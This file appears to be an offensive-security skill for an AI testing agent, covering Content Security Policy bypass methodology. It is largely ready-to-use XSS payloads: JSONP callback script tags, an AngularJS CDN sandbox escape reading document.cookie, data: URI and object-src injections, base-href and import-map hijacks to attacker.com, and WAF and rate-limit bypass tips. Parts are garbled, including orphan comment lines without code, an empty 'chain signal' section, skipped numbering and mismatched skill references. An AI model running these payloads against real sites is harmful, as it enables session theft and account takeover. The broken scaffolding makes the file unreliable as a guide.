---

name: web-17-csp-analysis
sequence: web-17
category: xss
domain: web
description: "Content Security Policy analysis and bypass testing skill for offensive security. Covers CSP misconfiguration detection, JSONP endpoint bypasses, unsafe-inline/eval exploitation, nonce reuse, Angular CDN CSP bypass chains, wildcard domain abuse, and missing directive exploitation. Use when testing CSP implementations, identifying XSS enablement via CSP weakness, or bypassing CSP protections."
wordlist_ref: "wordlists/web/web-18-csp-analysis/"
---

# Content Security Policy (CSP) Analysis — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Analyze Content Security Policy headers for weaknesses, bypasses, and misconfigurations that allow XSS despite CSP being present. Identify bypasses via JSONP endpoints, unsafe directives, nonce leakage, and CDN-hosted attack scripts.

## OWASP Mapping
- A03:2021 Injection (XSS enablement)
- A05:2021 Security Misconfiguration
- CWE-693: Protection Mechanism Failure

## Vulnerability Classes

### 1. CSP Absent / Report-Only Mode
**Missing CSP:**
- No `Content-Security-Policy` header → XSS unrestricted
- Only `Content-Security-Policy-Report-Only` → enforcement disabled, reporting only

**Detection:** `nuclei -t http/misconfiguration/csp-missing.yaml`

### 2. unsafe-inline in script-src
**Impact:** Allows execution of inline `<script>` tags, inline event handlers `onclick=`, `javascript:` URLs
```
script-src 'unsafe-inline' https://cdn.example.com
```
**Bypass:** Standard XSS payload without restriction

**Note:** Even with nonce-based CSP, if `unsafe-inline` also present → nonce serves no purpose

### 3. unsafe-eval in script-src
**Impact:** Allows `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`
```
script-src 'unsafe-eval' ...
```
**Exploit:** `eval(location.hash.slice(1))` or Angular template injection (AngularJS uses eval)

### 4. JSONP Endpoint Bypass
**Mechanism:** CSP allows specific trusted domain that hosts a JSONP callback endpoint
```
Content-Security-Policy: script-src 'self' https://accounts.google.com
```
**If accounts.google.com hosts JSONP:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Common JSONP endpoints on trusted CDNs:**
- `https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js?callback=`
- Various analytics, advertising, and social media endpoints
- Target's own domain JSONP endpoints (e.g., `/api/data?callback=alert`)

**Enumeration:** For each domain in script-src, probe for:
- `?callback=`, `?jsonp=`, `?cb=`, `?json_callback=` query parameters
- Known JSONP endpoints for major CDN providers

### 5. Angular/Framework Template Injection via Trusted CDN
**AngularJS 1.x on allowed domain:**
```
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com
```
AngularJS 1.x hosted on googleapis.com → load Angular → use `ng-app` + `{{constructor.constructor('alert(1)')()}}`

**React/Vue on allowed CDN:**
- React with `dangerouslySetInnerHTML` in app code
- Vue template injection if template engine reachable

### 5b. Angular CDN CSP Bypass Chain (Gap Fix — PortSwigger Lab)
**Description:** When CSP whitelists `https://ajax.googleapis.com` (or similar CDN), load AngularJS from the CDN and execute sandbox-escaped expressions.

**Full attack chain:**
```html
<!-- Step 1: Load AngularJS from whitelisted CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script>

<!-- Step 2: Bootstrap Angular on any page (even without ng-app) -->
<div ng-app>
  <!-- Step 3: Sandbox escape → arbitrary JavaScript execution -->
  {{constructor.constructor('alert(document.cookie)')()}}
</div>

<!-- No-string variant (if quotes are filtered): -->
<div ng-app>
  {{toString().constructor.fromCharCode(97,108,101,114,116,40,49,41)}}
</div>
```

**Detection methodology:**
1. Parse CSP `script-src` for CDN domains: `ajax.googleapis.com`, `cdnjs.cloudflare.com`, `unpkg.com`, `jsdelivr.net`
2. If Google CDN whitelisted → AngularJS 1.x CSP bypass is viable
3. If Cloudflare CDN whitelisted → test AngularJS or other exploitable libraries
5. Test payload injection on any page that reflects user input (even encoded)

**Known vulnerable CDN versions:**
- AngularJS 1.0.1–1.0.8: Full sandbox escape
- AngularJS 1.1.0–1.5.0: Sandbox escape with known bypasses
- AngularJS 1.5.1+: Harder but not impossible with no-string techniques

**Chain signal emission:**


### 6. Wildcard Domains in CSP
**Dangerous wildcards:**
```
script-src *.example.com    → any subdomain, including compromised ones
script-src *.amazonaws.com  → any S3 bucket or EC2 in any account
script-src *.googleapis.com → many JSONP endpoints
script-src *.github.io      → any GitHub Pages site (attacker-controlled)
script-src *.cdnjs.cloudflare.com  → specific library files only, but older versions have XSS
```

***.amazonaws.com bypass:** Register bucket `attacker-xss.s3.amazonaws.com` → host malicious JS → matches wildcard

### 7. Missing default-src Fallback
**Incomplete policy:**
```
Content-Security-Policy: script-src 'self'; style-src 'self'
```
Missing `default-src` means unspecified directives (object-src, media-src, etc.) default to permissive

**Critical missing directives:**
- `object-src 'none'` missing → `<object data="javascript:alert(1)">` bypasses script-src
- `base-uri 'self'` missing → `<base href="https://attacker.com">` → relative URLs hijacked
- `form-action 'self'` missing → form submission to attacker domain
- `frame-ancestors 'none'` missing → clickjacking possible

### 8. Nonce-Based CSP — Nonce Reuse/Prediction
**Nonce vulnerabilities:**
- Static nonce: same nonce used across all requests → attacker can observe and reuse
- Nonce in URL: `?nonce=abc` → logged in server logs, Referer headers
- Nonce in error messages: debugging info reveals current nonce
- DOM clobbering of nonce (see web-17)
- Short/weak nonce: < 128 bits of entropy → brute-forceable in some scenarios

**Detection:** Compare nonce values across 10 requests to the same page → check for reuse

### 9. data: URI in CSP
**Unsafe:**
```
script-src 'self' data:
```
`data:text/javascript,alert(1)` executes inline JavaScript via script src

### 10. CSP Header Injection
**If CSP header value is user-controlled:**
- Inject `; script-src *` to disable restriction
- Inject via HTTP response header injection (see web-29-crlf)
- Inject via proxy response modification

### 11. Subdomain Takeover for CSP Bypass
**Chain:**
1. CSP allows `https://static.target.com`
2. `static.target.com` is a takeover-vulnerable subdomain (see web-21)
3. Take over subdomain → host malicious script → CSP allows it

### 12. CSP Report Endpoint Abuse
**`report-uri` or `report-to` endpoints:**
- If report endpoint echoes back data → SSRF
- Report endpoint doesn't validate: injects arbitrary data into logs
- Report data contains sensitive path information

---

# Capture CSP header from baseline responses
# Collect CSP from all discovered pages
# Parse and evaluate each CSP
# ZAP passive scanner auto-detects CSP issues
# Alert: "Content Security Policy (CSP) Header Not Set"
# Alert: "CSP: Wildcard Directive"
# Alert: "CSP: script-src unsafe-inline"
# For each domain in CSP script-src, enumerate JSONP endpoints
# Emit signal for web-04-xss to consume
# Also emit if Angular CDN detected
## Attack Surface (Parameter Matrix)

| Surface | CSP Tests |
|---------|----------|
| All response headers | CSP presence on every page, not just main page |
| script-src directive | unsafe-inline, unsafe-eval, wildcards, JSONP |
| object-src directive | Missing → object/embed/applet XSS |
| base-uri directive | Missing → base tag hijacking |
| form-action directive | Missing → form exfiltration |
| frame-ancestors | Missing → clickjacking |
| Nonce values | Reuse across requests, entropy |
| JSONP endpoints | All domains in script-src |
| Subdomains in CSP | Takeover potential |
| report-uri endpoint | SSRF, log injection |

---

## HackerOne Report Patterns

**Pattern 1: JSONP bypass on googleapis (H1 #174070 type)**
CSP `script-src 'self' https://accounts.google.com` — accounts.google.com hosts JSONP endpoint at `/o/oauth2/revoke?callback=` → `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">` → CSP bypassed.

**Pattern 2: Subdomain wildcard + takeover (H1 #629421 type)**
CSP `script-src *.example.com`. `static.example.com` is unclaimed S3 bucket subdomain → register → host XSS payload → CSP trusts script source.

**Pattern 3: object-src missing (H1 common)**
Strong `script-src` but no `object-src` → `<object data="data:text/html,<script>alert(1)">` or `<embed src="data:text/html,...">` → XSS.

**Pattern 4: Static nonce (H1 multiple)**
Developer hardcoded nonce in template `nonce="abc123"` (same value always) → attacker observes nonce → uses it on injected script tag → CSP bypass.

**Pattern 5: Angular 1.x on CDN (H1 #125026 type)**
CSP allows `ajax.googleapis.com` → load AngularJS 1.6 from CDN → inject `<div ng-app>{{constructor.constructor('alert(1)')()}}` → XSS via Angular template execution.

---

## Zero-Day Research Hooks

### Novel CSP Bypass Vectors
- Import maps abuse: `<script type="importmap">{"imports": {"./": "https://attacker.com/"}}` — some CSPs allow import maps but don't restrict import sources
- Trusted Types bypass: improper TrustedTypes policy allows arbitrary sink assignment
- Service Worker scope CSP: SW registered at `sw.js` with CSP at `Content-Security-Policy` — SW scope may inherit or bypass CSP
- CSP hash collisions: finding second preimage of known hash → different payload with same hash (theoretical for SHA-256)
- Wasm CSP: `wasm-unsafe-eval` in CSP allows WebAssembly compilation → WASM-based payloads bypass script-src restrictions
- CSS injection → CSP bypass: CSS `@import url(attacker.com)` if `style-src` is weak

### Timing Oracle
- Nonce extraction timing: if application regenerates nonce synchronously, timing variance reveals nonce generation algorithm entropy

---

## False Positive Mitigation
- JSONP bypass: confirm endpoint actually returns executable JS with callback param (not just 200)
- Nonce reuse: test minimum 10 requests before declaring nonce static
- Wildcard: confirm actual bypass possible, not just theoretical — find specific exploitable endpoint
- unsafe-inline: confirm no nonce/hash that would override the unsafe-inline




## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-18-csp-analysis/`

**Files**:
- `wordlists/web/web-18-csp-analysis/payloads/csp/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

